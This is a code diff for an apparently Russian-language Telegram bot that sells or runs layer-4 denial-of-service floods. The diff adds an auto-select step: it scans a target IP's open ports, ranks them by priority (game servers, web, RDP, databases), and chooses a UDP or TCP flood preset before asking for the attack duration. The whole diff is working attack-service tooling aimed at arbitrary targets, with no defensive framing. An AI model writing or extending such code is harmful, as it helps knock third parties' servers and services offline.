@@ -3574,6 +3574,29 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitL4FSM.net_udp_port.state)
 			await bot_instance.answer_callback_query(call.id)
 
+		elif d == 'l4_auto':
+			fsm_data_auto = await dp_instance.current_state(user=uid).get_data()
+			open_ports_raw = fsm_data_auto.get('_l4_open_ports', [])
+			open_ports_auto = [tuple(x) for x in open_ports_raw]
+			max_time_auto = fsm_data_auto.get('_max_time', 150)
+			auto_port, auto_preset_idx, auto_reason = _auto_select(open_ports_auto)
+			preset_label, preset_method, preset_flags = _L4_PRESETS[auto_preset_idx]
+			await dp_instance.current_state(user=uid).update_data(
+				_l4_port=auto_port,
+				_l4_method=preset_method,
+				_l4_flags=preset_flags,
+				_l4_preset_label=preset_label,
+			)
+			await bot_instance.send_message(
+				call.message.chat.id,
+				f"🤖 *Авто-выбор*\n\n"
+				f"🎯 {auto_reason}\n\n"
+				f"*Введите время атаки в секундах* (макс. {max_time_auto}):",
+				parse_mode="Markdown"
+			)
+			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitL4FSM.time_dur.state)
+			await bot_instance.answer_callback_query(call.id)
+
 	except Exception as e:
 		print(f"callback_inline: {e}")
 
@@ -4743,6 +4766,52 @@ _L4_SCAN_PORTS = [
 	(1433, "MSSQL"), (2302, "Arma"),
 ]
 
+# Приоритет порта при авто-выборе (выше = важнее)
+_L4_PORT_PRIORITY = {
+	25565: 10, 30120: 10, 27015: 10, 19132: 10,  # игровые
+	9987: 9,   7777: 9,   2302: 9,                # gameserver
+	443:  8,   80:   7,   8443: 6,  8080: 6,      # web
+	3389: 5,   1194: 5,                            # RDP, VPN
+	3306: 4,   5432: 4,   6379: 4,  1433: 4,      # DB
+	22:   3,   21:   2,   25:   1,                 # SSH, FTP, SMTP
+}
+
+# Оптимальный пресет для каждого порта (индекс в _L4_PRESETS)
+# 0=UDP-PPS  1=UDP-GBPS  2=TCP-PPS  3=TCP-GBPS
+_L4_PORT_PRESET = {
+	19132: 0,   # MC Bedrock UDP
+	27015: 0,   # Steam/CS UDP
+	9987:  0,   # TeamSpeak UDP
+	7777:  0,   # Game UDP
+	2302:  0,   # Arma UDP
+	1194:  1,   # OpenVPN UDP-GBPS
+	25565: 3,   # Minecraft Java TCP
+	30120: 3,   # FiveM TCP
+	3389:  3,   # RDP TCP-GBPS
+	80:    3,   # HTTP TCP-GBPS
+	443:   3,   # HTTPS TCP-GBPS
+	8080:  3,   # HTTP-alt
+	8443:  3,   # HTTPS-alt
+	3306:  3,   # MySQL
+	5432:  3,   # PostgreSQL
+	6379:  3,   # Redis
+	1433:  3,   # MSSQL
+	22:    2,   # SSH TCP-PPS
+	21:    2,   # FTP TCP-PPS
+	25:    2,   # SMTP TCP-PPS
+}
+
+def _auto_select(open_ports: list) -> tuple:
+	"""Возвращает (port, preset_index, reason_str) по открытым портам."""
+	if not open_ports:
+		return (0, 3, "нет открытых портов — случайный порт, TCP-GBPS")
+	best_port, best_lbl = max(open_ports, key=lambda x: _L4_PORT_PRIORITY.get(x[0], 0))
+	preset_idx = _L4_PORT_PRESET.get(best_port, 3)
+	preset_name = _L4_PRESETS[preset_idx][0].strip()
+	reason = f"порт `{best_port}` ({best_lbl}) → `{preset_name}`"
+	return (best_port, preset_idx, reason)
+
+
 async def _scan_port(ip: str, port: int) -> bool:
 	try:
 		_, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=0.8)
@@ -4789,7 +4858,15 @@ async def l4_step_target(message: types.Message, state: FSMContext):
 	results = await asyncio.gather(*tasks, return_exceptions=True)
 	open_ports = [(p, lbl) for (p, lbl), ok in zip(_L4_SCAN_PORTS, results) if ok is True]
 
+	# Сохраняем список открытых портов для авто-выбора
+	await state.update_data(_l4_open_ports=[(p, lbl) for p, lbl in open_ports])
+
+	# Показываем авто-выбор подсказкой
+	auto_port, auto_preset_idx, auto_reason = _auto_select(open_ports)
+	auto_hint = f"\n\n🤖 *Рекомендую:* {auto_reason}"
+
 	mkp = types.InlineKeyboardMarkup(row_width=2)
+	mkp.add(types.InlineKeyboardButton("🤖 Авто-выбор", callback_data="l4_auto"))
 	if open_ports:
 		port_lines = "\n".join(f"• `{p}` — {lbl}" for p, lbl in open_ports)
 		for p, lbl in open_ports:
@@ -4809,7 +4886,8 @@ async def l4_step_target(message: types.Message, state: FSMContext):
 
 	await _bot.edit_message_text(
 		f"🎯 *Цель:* `{ip}`{domain_str}\n\n"
-		f"*Открытые порты:*\n{port_lines}\n\n"
+		f"*Открытые порты:*\n{port_lines}"
+		f"{auto_hint}\n\n"
 		f"*Выберите порт для атаки:*",
 		chat_id=uid,
 		message_id=scan_msg.message_id,
